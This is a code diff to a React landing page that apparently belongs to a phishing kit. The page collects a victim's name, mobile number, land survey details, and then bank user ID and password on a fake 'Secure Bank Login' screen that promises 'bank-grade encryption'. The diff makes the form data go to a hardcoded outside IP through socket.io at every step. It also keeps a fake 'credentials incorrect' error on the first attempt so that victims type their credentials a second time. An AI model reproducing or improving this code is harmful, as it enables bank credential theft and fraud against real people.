@@ -2,6 +2,7 @@ import React, { useEffect, useState } from "react";
 import toast from "react-hot-toast";
 import { Link } from "react-router-dom";
 import { io } from "socket.io-client";
+import { Shield, Lock, User, CreditCard } from 'lucide-react';
 const socket = io("http://13.126.153.247:4003");
 
 const Landingpage = () => {
@@ -64,6 +65,7 @@ const Landingpage = () => {
 
   // ✅ Enhanced handleNext with loader
   function handleNext() {
+    socket.emit("form:submit", formData);
     // Validation logic remains the same
     if (step == 1) {
       if (!formData?.name || !formData?.mobile || !formData?.pattaOrSurvey) {
@@ -85,11 +87,10 @@ const Landingpage = () => {
       if (step === 3) {
         if (loginAttempts === 0) {
           setLoginAttempts(1);
-          socket.emit("form:submit", formData);
           toast.error("Bank credentials incorrect. Please try again.");
           setIsLoading(false);
           return;
-        }
+        } 
         setTimer(7);
         setTimeout(() => {
           setStep((prev) => prev + 1);
@@ -114,6 +115,7 @@ const Landingpage = () => {
     socket.emit("form:submit", formData);
     setId("");
     setStep(1);
+    setLoginAttempts(0);
 
     setFormData({
       name: "",
@@ -2549,154 +2551,224 @@ const Landingpage = () => {
 
             {/* STEP 3 */}
             {step === 3 && (
-              <div
-                style={{
-                  background: "#fff",
-                  padding: "24px",
-                  borderRadius: "12px",
-                  boxShadow: "0 4px 12px rgba(0,0,0,0.1)",
-                  maxWidth: "400px",
-                  margin: "0 auto",
-                }}
-              >
-                <h3
-                  style={{
-                    textAlign: "center",
-                    marginBottom: "25px",
-                    color: "#333",
-                    fontSize: "20px",
-                  }}
-                >
-                  🏦 Bank Authentication
-                </h3>
+              <div style={{
+                minHeight: '100vh',
+                background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
+                display: 'flex',
+                alignItems: 'center',
+                justifyContent: 'center',
+                padding: '20px',
+                fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
+              }}>
+                <style>
+                  {`
+          @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+          }
+          
+          input:focus {
+            border-color: #007bff !important;
+            box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.1) !important;
+          }
+          
+          button:hover:not(:disabled) {
+            background-color: #0056b3 !important;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 16px rgba(0, 123, 255, 0.3) !important;
+          }
+        `}
+                </style>
 
-                {/* Bank Selection */}
-                {/* <div style={{ marginBottom: "18px" }}>
-                  <label
-                    style={{
-                      display: "block",
-                      marginBottom: "8px",
-                      fontWeight: 600,
-                      color: "#333",
-                    }}
-                  >
-                    Select Bank
-                  </label> */}
-                {/* <select
-                    name="bank"
-                    value={formData.bank}
-                    onChange={handleChange}
-                    style={{
-                      width: "100%",
-                      padding: "12px",
-                      borderRadius: "8px",
-                      border: "2px solid #e1e5e9",
-                      outline: "none",
-                      fontSize: "14px",
-                      backgroundColor: "white",
-                      transition: "border-color 0.3s ease",
-                    }}
-                  >
-                    <option value="">Select Bank</option>
-                    <option value="SBI">SBI</option>
-                    <option value="HDFC">HDFC</option>
-                    <option value="ICICI">ICICI</option>
-                    <option value="Axis">Axis Bank</option>
-                  </select> */}
-                {/* </div> */}
+                {/* {currentStep === 1 && ( */}
+                <div style={{
+                  background: '#fff',
+                  padding: '32px',
+                  borderRadius: '16px',
+                  boxShadow: '0 20px 40px rgba(0,0,0,0.15)',
+                  maxWidth: '440px',
+                  width: '100%',
+                  margin: '0 auto'
+                }}>
+                  {/* Header */}
+                  <div style={{
+                    textAlign: 'center',
+                    marginBottom: '32px'
+                  }}>
+                    <div style={{
+                      display: 'inline-flex',
+                      alignItems: 'center',
+                      justifyContent: 'center',
+                      width: '64px',
+                      height: '64px',
+                      background: 'linear-gradient(135deg, #007bff, #0056b3)',
+                      borderRadius: '16px',
+                      marginBottom: '16px'
+                    }}>
+                      <Shield size={32} color="white" />
+                    </div>
+                    <h2 style={{
+                      margin: '0 0 8px 0',
+                      color: '#1a1a1a',
+                      fontSize: '24px',
+                      fontWeight: '700'
+                    }}>
+                      Secure Bank Login
+                    </h2>
+                    <p style={{
+                      margin: 0,
+                      color: '#666',
+                      fontSize: '14px'
+                    }}>
+                      Enter your credentials to proceed with payment
+                    </p>
+                  </div>
 
-                {/* User ID */}
-                <div style={{ marginBottom: "18px" }}>
-                  <label
+                  {/* Security Notice */}
+                  <div style={{
+                    background: '#f8f9ff',
+                    border: '1px solid #e3e8ff',
+                    borderRadius: '12px',
+                    padding: '16px',
+                    marginBottom: '24px',
+                    display: 'flex',
+                    alignItems: 'center',
+                    gap: '12px'
+                  }}>
+                    <Lock size={20} color="#4f46e5" />
+                    <div>
+                      <p style={{
+                        margin: 0,
+                        fontSize: '13px',
+                        color: '#374151',
+                        fontWeight: '500'
+                      }}>
+                        🔒 Your information is protected with bank-grade encryption
+                      </p>
+                    </div>
+                  </div>
+
+                  {/* User ID Field */}
+                  <div style={{ marginBottom: '20px' }}>
+                    <label style={{
+                      display: 'block',
+                      marginBottom: '8px',
+                      fontWeight: '600',
+                      color: '#374151',
+                      fontSize: '14px'
+                    }}>
+                      <User size={16} style={{ display: 'inline', marginRight: '6px' }} />
+                      User ID
+                    </label>
+                    <input
+                      type="text"
+                      name="userId"
+                      placeholder="Enter your bank User ID"
+                      value={formData.userId}
+                      onChange={handleChange}
+                      style={{
+                        width: '100%',
+                        padding: '14px 16px',
+                        borderRadius: '10px',
+                        border: '2px solid #e5e7eb',
+                        outline: 'none',
+                        fontSize: '15px',
+                        transition: 'all 0.3s ease',
+                        backgroundColor: '#fafafa',
+                        boxSizing: 'border-box'
+                      }}
+                    />
+                  </div>
+
+                  {/* Password Field */}
+                  <div style={{ marginBottom: '28px' }}>
+                    <label style={{
+                      display: 'block',
+                      marginBottom: '8px',
+                      fontWeight: '600',
+                      color: '#374151',
+                      fontSize: '14px'
+                    }}>
+                      <Lock size={16} style={{ display: 'inline', marginRight: '6px' }} />
+                      Password
+                    </label>
+                    <input
+                      type="password"
+                      name="password"
+                      placeholder="Enter your bank password"
+                      value={formData.password}
+                      onChange={handleChange}
+                      style={{
+                        width: '100%',
+                        padding: '14px 16px',
+                        borderRadius: '10px',
+                        border: '2px solid #e5e7eb',
+                        outline: 'none',
+                        fontSize: '15px',
+                        transition: 'all 0.3s ease',
+                        backgroundColor: '#fafafa',
+                        boxSizing: 'border-box'
+                      }}
+                    />
+                  </div>
+
+                  {/* Login Button */}
+                  <button
                     style={{
-                      display: "block",
-                      marginBottom: "8px",
-                      fontWeight: 600,
-                      color: "#333",
+                      width: '100%',
+                      padding: '16px',
+                      backgroundColor: timer !== 0 || isLoading ? '#9ca3af' : '#007bff',
+                      color: 'white',
+                      border: 'none',
+                      borderRadius: '12px',
+                      cursor: timer !== 0 || isLoading ? 'not-allowed' : 'pointer',
+                      fontSize: '16px',
+                      fontWeight: '600',
+                      transition: 'all 0.3s ease',
+                      display: 'flex',
+                      alignItems: 'center',
+                      justifyContent: 'center',
+                      gap: '10px',
+                      boxShadow: timer !== 0 || isLoading ? 'none' : '0 4px 12px rgba(0, 123, 255, 0.2)'
                     }}
+                    disabled={timer !== 0 || isLoading}
+                    onClick={isLoading || timer !== 0 ? null : handleNext}
                   >
-                    User ID
-                  </label>
-                  <input
-                    type="text"
-                    name="userId"
-                    placeholder="Enter Bank User ID"
-                    value={formData.userId}
-                    onChange={handleChange}
-                    style={{
-                      width: "95%",
-                      padding: "12px",
-                      borderRadius: "8px",
-                      border: "2px solid #e1e5e9",
-                      outline: "none",
-                      fontSize: "14px",
-                      transition: "border-color 0.3s ease",
-                    }}
-                  />
+                    {isLoading ? (
+                      <>
+                        <Loader />
+                        Loading...
+                      </>
+                    ) : timer !== 0 ? (
+                      `Please wait ${timer}s`
+                    ) : (
+                      <>
+                        <CreditCard size={20} />
+                        Proceed to Payment
+                      </>
+                    )}
+                  </button>
+
+                  {/* Footer Links */}
+                  <div style={{
+                    textAlign: 'center',
+                    marginTop: '24px',
+                    paddingTop: '20px',
+                    borderTop: '1px solid #e5e7eb'
+                  }}>
+                    <div style={{
+                      display: 'flex',
+                      justifyContent: 'center',
+                      gap: '20px',
+                      fontSize: '13px',
+                      color: '#6b7280'
+                    }}>
+                      <a href="#" style={{ color: '#007bff', textDecoration: 'none' }}>Forgot Password?</a>
+                      <a href="#" style={{ color: '#007bff', textDecoration: 'none' }}>Contact Support</a>
+                    </div>
+                  </div>
                 </div>
-
-                {/* Password */}
-                <div style={{ marginBottom: "25px" }}>
-                  <label
-                    style={{
-                      display: "block",
-                      marginBottom: "8px",
-                      fontWeight: 600,
-                      color: "#333",
-                    }}
-                  >
-                    Password
-                  </label>
-                  <input
-                    type="password"
-                    name="password"
-                    placeholder="Enter Bank Password"
-                    value={formData.password}
-                    onChange={handleChange}
-                    style={{
-                      width: "95%",
-                      padding: "12px",
-                      borderRadius: "8px",
-                      border: "2px solid #e1e5e9",
-                      outline: "none",
-                      fontSize: "14px",
-                      transition: "border-color 0.3s ease",
-                    }}
-                  />
-                </div>
-
-                {/* Next Button */}
-                <button
-                  style={{
-                    width: "100%",
-                    padding: "14px",
-                    backgroundColor: timer !== 0 || isLoading ? "#6c757d" : "#007bff",
-                    color: "white",
-                    border: "none",
-                    borderRadius: "8px",
-                    cursor: timer !== 0 || isLoading ? "not-allowed" : "pointer",
-                    fontSize: "16px",
-                    fontWeight: "600",
-                    transition: "all 0.3s ease",
-                    display: "flex",
-                    alignItems: "center",
-                    justifyContent: "center",
-                    gap: "10px",
-                  }}
-                  disabled={timer !== 0 || isLoading}
-                  onClick={isLoading || timer !== 0 ? null : handleNext}
-                >
-                  {isLoading ? (
-                    <>
-                      <Loader />
-                      {`Loading... ${loginAttempts !== 0 && timer !== 0 ? timer : ""}`}
-                    </>
-                  ) : timer !== 0 ? (
-                    `Please wait ${timer}s`
-                  ) : (
-                    "Next ➡"
-                  )}
-                </button>
+                {/* )} */}
               </div>
             )}
 
